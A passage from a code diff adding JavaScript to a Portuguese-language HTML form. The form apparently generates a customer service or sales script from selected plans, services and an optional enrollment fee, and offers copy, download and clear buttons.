+                    document.querySelectorAll('.adesao-opcao').forEach(o => o.classList.remove('selected'));
+                    opcao.classList.add('selected');
+                    
+                    const tipo = opcao.dataset.adesao;
+                    state.adesao.tipo = tipo;
+                    
+                    const detalhes = document.getElementById('adesaoDetalhes');
+                    if (tipo === 'paga') {
+                        detalhes.classList.add('show');
+                    } else {
+                        detalhes.classList.remove('show');
+                        state.adesao.vencimento = null;
+                        state.adesao.valor = null;
+                    }
+                    atualizarResumo();
+                    gerarScript();
+                });
+            });
+
+            document.getElementById('adesaoVencimento').addEventListener('change', (e) => {
+                state.adesao.vencimento = e.target.value;
+                atualizarResumo();
+                gerarScript();
+            });
+
+            document.getElementById('adesaoValor').addEventListener('change', (e) => {
+                state.adesao.valor = e.target.value;
+                atualizarResumo();
+                gerarScript();
+            });
+
+            // Botões de ação
+            document.getElementById('btnCopiar').addEventListener('click', async () => {
+                if (!state.scriptGerado) return;
+                try {
+                    await navigator.clipboard.writeText(state.scriptGerado);
+                    showToast('Script copiado!');
+                } catch (err) {
+                    const textarea = document.createElement('textarea');
+                    textarea.value = state.scriptGerado;
+                    document.body.appendChild(textarea);
+                    textarea.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(textarea);
+                    showToast('Script copiado!');
+                }
+            });
+
+            document.getElementById('btnBaixar').addEventListener('click', () => {
+                if (!state.scriptGerado) return;
+                const blob = new Blob([state.scriptGerado], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                
+                const nomeCliente = document.getElementById('nome').value.trim()
+                    .replace(/\s+/g, '_')
+                    .replace(/[^a-zA-Z0-9_À-ÿ]/g, '');
+                const nomeArquivo = nomeCliente ? `script_${nomeCliente}_${Date.now()}.txt` : `script_${Date.now()}.txt`;
+                
+                a.href = url;
+                a.download = nomeArquivo;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                showToast('Arquivo baixado!');
+            });
+
+            document.getElementById('btnLimpar').addEventListener('click', () => {
+                if (!confirm('Limpar todos os dados?')) return;
+                
+                document.querySelectorAll('.form-input, .form-textarea').forEach(i => i.value = '');
+                document.querySelectorAll('.form-select').forEach(s => s.value = '');
+                document.querySelectorAll('.checkbox-item').forEach(c => {
+                    c.classList.remove('selected');
+                    c.querySelector('input').checked = false;
+                });
+                
+                state.planoSelecionado = null;
+                state.servicosSelecionados.clear();
+                state.utilizacoes = [];
+                state.adesao = { tipo: null, vencimento: null, valor: null };
+                state.valorPromocional = null;
+                state.scriptGerado = null;
+                
+                document.getElementById('promoSection').classList.remove('show');
+                document.getElementById('adesaoDetalhes').classList.remove('show');
+                document.querySelectorAll('.adesao-opcao').forEach(o => o.classList.remove('selected'));
+                document.getElementById('scriptOutput').classList.remove('show');
+                document.getElementById('btnCopiar').disabled = true;
+                document.getElementById('btnBaixar').disabled = true;
+                
+                renderizarPlanos();
+                renderizarServicos();
+                atualizarResumo();
+                
+                showToast('Dados limpos!');
+            });
+
+            // Renderização inicial
+            renderizarPlanos();
+            renderizarServicos();
+            
+            const hoje = new Date().toISOString().split('T')[0];
+            document.getElementById('dataAgendamento').min = hoje;
+        };
+
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', inicializar);
+        } else {
+            inicializar();
+        }
+    </script>
 </body>
 </html>
